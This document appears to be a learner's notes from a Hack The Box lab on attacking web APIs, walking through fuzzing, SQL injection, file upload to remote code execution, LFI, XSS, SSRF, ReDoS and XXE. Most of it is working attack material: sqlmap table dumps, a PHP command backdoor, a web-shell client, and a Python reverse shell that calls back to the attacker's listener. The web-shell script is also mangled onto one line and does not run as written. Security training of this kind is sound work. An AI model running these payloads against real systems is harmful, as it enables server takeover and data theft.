# Information Disclosure (with a twist of SQLi)
## Information Disclosure through Fuzzing
```
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
```
It looks like id is a valid parameter. Let us check the response when specifying id as a parameter and a test value.
Find below a Python script that could automate retrieving all information that the API returns (save it as brute_api.py).
```
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()

```
The above script can be run, as follows.
```
python3 brute_api.py http://TARGETIP:3003
```
TIP: If there is a rate limit in place, you can always try to bypass it through headers such as X-Forwarded-For, X-Forwarded-IP, etc., or use proxies. These headers have to be compared with an IP most of the time. See an example below.
```
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```
The issue here is that the code compares the HTTP_X_FORWARDED_FOR header to the possible whitelist values, and if the HTTP_X_FORWARDED_FOR is not set or is set without one of the IPs from the array, it'll give a 401. A possible bypass could be setting the X-Forwarded-For header and the value to one of the IPs from the array.

# Information Disclosure through SQL Injection
SQL injection vulnerabilities can affect APIs as well. That id parameter looks interesting. Try submitting classic SQLi payloads and answer the second question.
```
sqlmap -u "http://10.129.202.133:3003/?id=1" --batch
```
```
sqlmap -u "http://10.129.202.133:3003/?id=1" --tables -D htb
```
```
sqlmap -u "http://10.129.202.133:3003/?id=1" --dump -T users -D htb 
```
# Arbitrary File Upload
Arbitrary file uploads are among the most critical vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server. Arbitrary file upload vulnerabilities affect web applications and APIs alike.
## PHP File Upload via API to RCE
1. Let us create the below file (save it as backdoor.php) and try to upload it via the available functionality. (add `<?`  and `?>` to the file)
```
php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }
```
The above allows us to append the parameter cmd to our request (to backdoor.php), which will be executed using system(). This is if we can determine backdoor.php's location, if backdoor.php will be rendered successfully and if no PHP function restrictions exist.
2. We can use the below Python script (save it as web_shell.py) to obtain a shell, leveraging the uploaded backdoor.php file.
```
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands) parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example. if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu parser.print_help() # shows help menu elif args.target and args.payload: # elif (if they both have values do some action) print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell) os.system("clear") # clear the screen (linux) while True: # starts a while loop (never ending loop) try: # try statement cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value time.sleep(0.3) # waits 0.3 seconds during each request except requests.exceptions.InvalidSchema: # error handling print("Invalid URL Schema: http:// or https://") except requests.exceptions.ConnectionError: # error handling print("URL is invalid"
```
Use the above script as follows: 
```
python3 web_shell.py -t http://<TARGET IP>:3001/uplosfd/backdoor.php -o yes
```
3. To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
# Local File Inclusion (LFI)
Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being Apache Log Poisoning
```
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```
It looks like /api/download is a valid API endpoint. Let us interact with it.
```
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```
# Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) vulnerabilities affect web applications and APIs alike. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities.
Suppose we are having a better look at the API of the previous section, `http://<TARGET IP>:3000/api/download`. Let us first interact with it through the browser by requesting the belo
test_value is reflected in the response.
Let us see what happens when we enter a payload such as the below (instead of test_value).
```
<script>alert(document.domain)</script>
```
It looks like the application is encoding the submitted payload. We can try URL-encoding our payload once and submitting it again, as follows.
```
%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```
Now our submitted JavaScript payload is evaluated successfully. The API endpoint is vulnerable to XSS!
# Server-Side Request Forgery (SSRF)
Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. 
We can usually find SSRF vulnerabilities in applications or APIs that fetch remote resources
As we have mentioned multiple times, though, we should fuzz every identified parameter, even if it does not seem tasked with fetching remote resources.
Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/userinfo`.
The API is expecting a parameter called id. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first.
```
nc -lvnp 4444
```
Then, let us specify `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` as the value of the id parameter and make an API call.
```
curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
```
We notice an error about the id parameter being invalid, and we also notice no connection being made to our listener.
In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` and making an API call again.
```
echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
```
```
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```
When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.
# Regular Expression Denial of Service (ReDoS)
Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in a regular expression to increase evaluation time is called a Regular Expression Denial of Service (ReDoS) attack.
The API resides in `http://<TARGET IP>:3000/api/check-emai`l and accepts a parameter called email.
Let's interact with it as follows.
Let's submit the following valid value and see how long the API takes to respond.
```
curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
```
You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.
The difference in response time between the first cURL command above and the second is significant.
The API is undoubtedly vulnerable to ReDoS attacks.
# XML External Entity (XXE) Injection
XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down.
Suppose we are assessing such an application residing in `http://<TARGET IP>:3001`.

By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.

Activate burp suite's proxy (Intercept On) and configure your browser to go through it.

Now let us try authenticating. We should see the below inside Burp Suite's proxy.
DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).
Let us try crafting an exploit to read internal files such as /etc/passwd on the server.

First, we will need to append a DOCTYPE to this request.

What is a DOCTYPE?
We defined a DTD called pwn, and inside of that, we have an `ENTITY`. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the `ENTITY` keyword, followed by the ENTITY name and its value.

We have called our external entity `somename`, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal file
Our current payload is:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```
Let us set up a Netcat listener as follows.
```
nc -lvnp 4444
```
Now let us make an API call containing the payload we crafted above.
```
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
```
We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows
```
curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```
After the call to the API, you will notice a connection being made to the listener.
The API is vulnerable to XXE Injection.